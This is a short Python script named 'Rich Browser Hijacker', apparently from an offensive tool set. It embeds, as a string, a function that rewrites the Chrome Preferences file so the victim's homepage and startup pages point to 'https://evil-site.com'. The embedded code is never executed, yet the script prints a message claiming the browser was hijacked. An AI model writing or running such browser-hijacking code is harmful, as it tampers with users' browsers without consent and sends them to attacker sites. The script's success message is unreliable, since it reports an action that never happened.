#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich Browser Hijacker"""

from rich.console import Console
from rich.panel import Panel

console = Console()

class BrowserHijacker:
    def hijack(self):
        """Hijack browser settings"""
        console.print(Panel.fit(
            "[bold red]Browser Hijacker[/bold red]",
            border_style="red"
        ))
        
        # Chrome/Firefox/Edge hijacking
        code = '''
import os
import json

def hijack_chrome():
    # Chrome preferences
    prefs_path = os.path.join(os.getenv('LOCALAPPDATA'),
                             'Google\\Chrome\\User Data\\Default\\Preferences')
    
    with open(prefs_path, 'r') as f:
        prefs = json.load(f)
    
    prefs['homepage'] = 'https://evil-site.com'
    prefs['homepage_is_newtabpage'] = False
    prefs['startup_urls'] = ['https://evil-site.com']
    
    with open(prefs_path, 'w') as f:
        json.dump(prefs, f)
'''
        
        console.print("[green]✓ Browser hijacked[/green]")

if __name__ == "__main__":
    hij = BrowserHijacker()
    hij.hijack()

